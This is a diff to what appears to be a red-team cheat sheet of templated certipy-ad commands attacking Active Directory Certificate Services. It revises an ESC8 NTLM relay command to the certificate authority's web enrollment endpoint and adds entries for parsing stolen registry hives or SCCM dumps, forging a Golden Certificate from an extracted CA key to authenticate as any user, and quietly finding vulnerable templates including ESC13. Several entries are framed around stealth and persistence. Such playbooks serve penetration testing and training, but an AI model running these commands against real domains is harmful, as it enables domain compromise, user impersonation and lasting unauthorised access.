@@ -128,10 +128,10 @@ certipy-ad req -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{PASSW
 ---
 
 ## esc8 ntlm relay web enrollment
-Run a relay listener that forwards inbound NTLM auth to the CA's web enrollment endpoint to obtain a cert.
+Run a relay listener that forwards inbound NTLM auth to the CA's web enrollment endpoint to obtain a cert. (v5.x uses -target with URL scheme)
 
 ```bash
-certipy-ad relay -ca {{CA_HOST:domain:ca.corp.local}}
+certipy-ad relay -target http://{{CA_HOST:domain:ca.corp.local}}/certsrv
 ```
 
 <!-- meta: risk=critical | phase=exploit | tags=esc8,ntlm-relay,web-enrollment -->
@@ -179,3 +179,36 @@ certutil -enrollmentServerURL -config '{{CA_HOST:str:DC01.DOMAIN.LOCAL}}\{{CA_NA
 ```
 
 <!-- meta: risk=safe | phase=enum | tags=certutil,enrollment,enumerate -->
+
+---
+
+## parse certificate hive offline
+Offline enum from a stolen registry hive or SCCM dump. Zero network noise — huge OpSec win when you already have host foothold.
+
+```bash
+certipy-ad parse {{DUMPTYPE:choice:-registry=Windows registry hive,-sccm=SCCM dump}} {{DUMP:file}}
+```
+
+<!-- meta: risk=low | phase=post | tags=certipy,offline,parse,registry,sccm -->
+
+---
+
+## forge golden certificate
+Golden Certificate forging after CA private key extraction. Classic post-DA persistence — auth as any user.
+
+```bash
+certipy-ad forge -ca-pfx {{CA_PFX:file}} -upn '{{UPN:str:administrator@example.local}}' -sid {{SID:str}}
+```
+
+<!-- meta: risk=high | phase=post | tags=certipy,forge,golden,persistence,ca-key -->
+
+---
+
+## find vulnerable templates fast esc13
+Faster + noise-reduced find: skips per-host CA enum (-dc-only, ~10x faster), hides admins, includes -oids for ESC13 (issuance policy abuse) detection.
+
+```bash
+certipy-ad find -u {{USER:str}}@{{DOMAIN:domain}} -p {{PASS:str}} -dc-ip {{DC_IP:ip}} -vulnerable -oids -dc-only -hide-admins -stdout
+```
+
+<!-- meta: risk=low | phase=recon | tags=certipy,find,esc13,vulnerable,fast -->
